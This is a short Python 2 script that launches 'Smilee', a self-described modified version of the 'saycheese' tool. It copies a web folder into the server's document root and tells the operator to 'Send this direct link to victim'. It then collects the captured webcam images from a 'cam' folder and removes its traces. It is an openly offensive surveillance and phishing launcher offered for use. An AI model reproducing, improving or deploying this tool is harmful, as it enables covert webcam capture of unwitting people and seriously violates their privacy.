import os
import sys
import shutil
import time

def banner():
	print "	Smilee v-0.1 modifed version of saycheese\n	modified by Aman Rawat\n"

def input():
	url = raw_input("	[+] Enter the your link: ")
	print "	[+] Direct link : " + url + "/smilee/"
	print "	[+] Send this direct link to victim [+] \n"
	try:
		while True:
			pass

	except KeyboardInterrupt:
		print "	[+] Exiting tool please wait..."
		if os.path.exists('output/cam') == True:
			shutil.rmtree('output/cam')
			dest1 = shutil.move("/var/www/html/smilee/cam", "output")
			dest2 = shutil.rmtree("/var/www/html/smilee")
			time.sleep(5)
			sys.exit()


		else:
			dest1 = shutil.move("/var/www/html/smilee/cam", "output")
			dest2 = shutil.rmtree("/var/www/html/smilee")
			time.sleep(5)
			sys.exit()
			
	
def  function():
	if os.path.exists('/var/www/html/smilee') != True:
		dest = shutil.copytree("smilee/", "/var/www/html/smilee") 
		input()
	else:
		input()
	

banner()
function()
